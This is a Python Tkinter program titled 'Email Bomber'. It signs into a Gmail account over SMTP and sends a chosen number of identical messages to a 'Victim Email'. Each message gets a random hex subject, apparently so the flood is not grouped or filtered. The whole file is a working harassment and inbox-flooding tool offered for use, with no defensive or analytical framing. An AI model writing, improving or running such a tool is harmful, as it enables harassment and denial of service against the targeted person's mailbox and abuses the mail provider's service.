import os
import smtplib
import sys
import random
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import tkinter as tk
from tkinter import messagebox, simpledialog

def send_emails(user, passworde, victim, message_body, num_send):
    smtp_server = 'smtp.gmail.com'
    port = 587

    try:
        with smtplib.SMTP(smtp_server, port) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(user, passworde)
            
            for i in range(1, num_send + 1):
                subject = os.urandom(9).hex()
                msg = MIMEMultipart()
                msg['From'] = user
                msg['To'] = victim
                msg['Subject'] = subject

                msg.attach(MIMEText(message_body, 'plain'))

                server.sendmail(user, victim, msg.as_string())
                listbox.insert(tk.END, f"Email SENT: {i}")
                listbox.yview(tk.END)
                app.update()

            messagebox.showinfo("Success", "All messages were sent")

    except smtplib.SMTPAuthenticationError:
        messagebox.showerror("Error", "The username or password you entered is incorrect. Check if the option of 'Less secure app access' is enabled.")
    except Exception as e:
        messagebox.showerror("Error", str(e))

def start_sending():
    user = entry_user.get()
    passworde = simpledialog.askstring("Password", "Enter your password:", show='*')
    victim = entry_victim.get()
    message_body = entry_message.get()
    num_send = entry_num_send.get()

    if not user or not passworde or not victim or not message_body or not num_send:
        messagebox.showerror("Error", "All fields must be filled out.")
        return

    try:
        num_send = int(num_send)
    except ValueError:
        messagebox.showerror("Error", "Number of send must be an integer.")
        return

    send_emails(user, passworde, victim, message_body, num_send)

app = tk.Tk()
app.title("Email Bomber")

frame = tk.Frame(app)
frame.pack(padx=10, pady=10)

tk.Label(frame, text="Your Email").grid(row=0, column=0, padx=5, pady=5, sticky='e')
entry_user = tk.Entry(frame, width=40)
entry_user.grid(row=0, column=1, padx=5, pady=5)

tk.Label(frame, text="Victim Email").grid(row=1, column=0, padx=5, pady=5, sticky='e')
entry_victim = tk.Entry(frame, width=40)
entry_victim.grid(row=1, column=1, padx=5, pady=5)

tk.Label(frame, text="Your Message").grid(row=2, column=0, padx=5, pady=5, sticky='e')
entry_message = tk.Entry(frame, width=40)
entry_message.grid(row=2, column=1, padx=5, pady=5)

tk.Label(frame, text="No. of Send").grid(row=3, column=0, padx=5, pady=5, sticky='e')
entry_num_send = tk.Entry(frame, width=40)
entry_num_send.grid(row=3, column=1, padx=5, pady=5)

btn_send = tk.Button(app, text="Start Sending", command=start_sending)
btn_send.pack(pady=10)

listbox = tk.Listbox(app, width=50, height=10)
listbox.pack(pady=10)

app.mainloop()
